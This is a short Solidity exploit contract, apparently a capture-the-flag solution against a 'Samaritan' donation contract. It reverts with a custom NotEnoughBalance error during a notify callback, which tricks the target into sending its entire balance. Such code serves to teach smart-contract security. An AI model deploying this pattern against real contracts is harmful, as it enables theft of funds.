// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface ISamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Hack {
    ISamaritan private immutable samaritan;

    error NotEnoughBalance();

    constructor(address contractAddress) {
        samaritan = ISamaritan(contractAddress);
    }

    function attack() external {
        samaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
